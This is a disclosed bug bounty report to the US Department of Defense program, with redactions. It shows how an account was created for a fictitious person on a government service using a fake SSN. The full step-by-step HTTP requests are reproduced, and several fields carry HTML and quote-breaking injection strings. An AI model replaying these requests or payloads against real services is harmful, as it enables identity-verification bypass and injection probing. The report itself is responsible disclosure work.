# Illegal account registration in ████████

## Report Details
- **Report ID**: 204048
- **URL**: https://hackerone.com/reports/204048
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-02-07T00:05:29.940Z
- **Disclosed**: 2019-12-02T18:36:31.685Z

## Reporter
- **Username**: akaki
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
**Summary:**
Can create an account of nonexistent person (John Doe) in ████.

**Description:**
Input the following values on the [Create Account Step1 page](https://███/app/create1).

```
Last Name:              Doe
Date of Birth:          JAN 1 2017
Social Security Number: 123-45-6789
```

Request (Step1):
```
POST /cc/account_creation/step1_submit HTTP/1.1
Host: ████████
 .. snip ..
Connection: close

i_id=0&f_tok=_p9kmWKZfpl6mWSZfpl0mUaZRJlKmUwH~AfsFVoHXgc!&form=%5B%7B%22name%22%3A%22last_name%22%2C%22value%22%3A%22Doe%22%2C%22table%22%3A%22contacts%22%2C%22required%22%3Atrue%2C%22prev%22%3Anull%2C%22custom%22%3Afalse%7D%2C%7B%22name%22%3A%22exp_date%22%2C%22value%22%3A%222017-1-1%22%2C%22table%22%3A%22contacts%22%2C%22required%22%3Atrue%2C%22prev%22%3Anull%2C%22custom%22%3Atrue%2C%22customID%22%3A292%2C%22customType%22%3A1%7D%2C%7B%22name%22%3A%22ssan%22%2C%22value%22%3A%22123456789%22%2C%22table%22%3A%22contacts%22%2C%22required%22%3Atrue%2C%22prev%22%3Anull%2C%22custom%22%3Atrue%2C%22customID%22%3A185%2C%22customType%22%3A%22ssn%22%7D%5D
```

Response (Step1):
```
HTTP/1.1 200 OK
Date: Fri, 20 Jan 2017 15:15:14 GMT
 .. snip ..
Content-Length: 50

{"sessionParm":"","status":1,"message":"Success!"}
```

Input appropriate values on the Step2 page.
The following values were set as authentication information.

```
UserID:   John'
Password: "><s>'John123
```

Request (Step2):
```
POST /cc/account_creation/step2_submit HTTP/1.1
Host: ███████
 .. snip ..
Connection: close

i_id=0&f_tok=_p9kmWKZfpl6mWSZfpl0mUyZQJlYmUwH~AfsFVoHXgc!&form=%5B%7B%22name%22%3A%22curr_gr%22%2C%22value%22%3A%22%5C%22%3E'A%22%2C%22table%22%3A%22contacts%22%2C%22required%22%3Atrue%2C%22prev%22%3Anull%2C%22custom%22%3Atrue%2C%22customID%22%3A49%2C%22customType%22%3A8%7D%2C%7B%22name%22%3A%22first_name%22%2C%22value%22%3A%22%5C%22%3E%3Cs%3E'John%22%2C%22table%22%3A%22contacts%22%2C%22required%22%3Atrue%2C%22prev%22%3Anull%2C%22custom%22%3Afalse%7D%2C%7B%22name%22%3A%22last_name%22%2C%22value%22%3A%22%5C%22%3E%3Cs%3E'Doe%22%2C%22table%22%3A%22contacts%22%2C%22required%22%3Atrue%2C%22prev%22%3Anull%2C%22custom%22%3Afalse%7D%2C%7B%22name%22%3A%22ssan%22%2C%22value%22%3A%22123456789%22%2C%22table%22%3A%22contacts%22%2C%22required%22%3Atrue%2C%22prev%22%3A%22123456789%22%2C%22custom%22%3Atrue%2C%22customID%22%3A185%2C%22customType%22%3A%22ssn%22%7D%2C%7B%22name%22%3A%22exp_date%22%2C%22value%22%3A%222017-1-1%22%2C%22table%22%3A%22contacts%22%2C%22required%22%3Atrue%2C%22prev%22%3A1483250400%2C%22custom%22%3Atrue%2C%22customID%22%3A292%2C%22customType%22%3A1%7D%2C%7B%22name%22%3A%22email%22%2C%22value%22%3A%22pen%40tiara.ocn.ne.jp%22%2C%22table%22%3A%22contacts%22%2C%22required%22%3Atrue%2C%22prev%22%3Anull%2C%22custom%22%3Afalse%7D%2C%7B%22name%22%3A%22email_alt1%22%2C%22value%22%3A%22%22%2C%22table%22%3A%22contacts%22%2C%22required%22%3Afalse%2C%22prev%22%3Anull%2C%22custom%22%3Afalse%7D%2C%7B%22name%22%3A%22email_alt2%22%2C%22value%22%3A%22%22%2C%22table%22%3A%22contacts%22%2C%22required%22%3Afalse%2C%22prev%22%3Anull%2C%22custom%22%3Afalse%7D%2C%7B%22name%22%3A%22login%22%2C%22value%22%3A%22John'%22%2C%22table%22%3A%22contacts%22%2C%22required%22%3Atrue%2C%22prev%22%3Anull%2C%22custom%22%3Afalse%7D%2C%7B%22name%22%3A%22password_new%22%2C%22value%22%3A%22%5C%22%3E%3Cs%3E'John123%22%2C%22table%22%3A%22contacts%22%2C%22required%22%3Atrue%2C%22custom%22%3Afalse%7D%2C%7B%22name%22%3A%22password_verify%22%2C%22value%22%3A%22%5C%22%3E%3Cs%3E'John123%22%2C%22table%22%3A%22contacts%22%2C%22required%22%3Atrue%2C%22custom%22%3Afalse%7D%2C%7B%22name%22%3A%22pin%22%2C%22value%22%3A%2212345678%22%2C%22table%22%3A%22contacts%22%2C%22required%22%3Atrue%2C%22prev%22%3Anull%2C%22custom%22%3Atrue%2C%22customID%22%3A221%2C%22customType%22%3A%22verify%22%7D%2C%7B%22name%22%3A%22security_question%22%2C%22value%22%3A%22%7B%5C%22Who%20was%20your%20favorite%20cartoon%20character%20as%20a%20child%3F%5C%22%20%3A%20%5C%22%5C%22%3E%3Cs%3E'John%5C%22%2C%20%5C%22What%20was%20the%20name%20of%20your%20best%20friend%20as%20a%20child%3F%5C%22%20%3A%20%5C%22%5C%22%3E%3Cs%3E'John%5C%22%2C%20%5C%22What%20was%20the%20name%20of%20your%20favorite%20teacher%20in%20high%20school%3F%5C%22%20%3A%20%5C%22%5C%22%3E%3Cs%3E'John%5C%22%2C%20%5C%22What%20was%20your%20first%20job%3F%5C%22%20%3A%20%5C%22%5C%22%3E%3Cs%3E'John%5C%22%2C%20%5C%22What%20was%20your%20favorite%20sport%20as%20a%20teenager%3F%5C%22%20%3A%20%5C%22%5C%22%3E%3Cs%3E'John%5C%22%7D%22%2C%22table%22%3A%22contacts%22%2C%22required%22%3Atrue%2C%22prev%22%3Anull%2C%22custom%22%3Atrue%2C%22customID%22%3A294%2C%22customType%22%3A6%7D%5D
```

Response (Step2):
```
HTTP/1.1 200 OK
Date: Fri, 20 Jan 2017 15:24:19 GMT
 .. snip ..
Content-Length: 50

{"sessionParm":"","message":"Success!","status":1}
```

For response message, it is thought that the creation of the account is successful.


## Impact
Potential for unauthorized use of ███'s services by anonymous users.

## Suggested Remediation Actions
Accurately associate Social Security Number and personal information, and prohibit registration with nonexistent person.

**Note:**
I was locked because I failed to log in to this account many times.
████████

However, from the [Reset Password page](https://███/app/forgot), I confirm that the account is registered. In addition, I received a mail from ████████ to the registered mail address.
████

## Attachments
No attachments
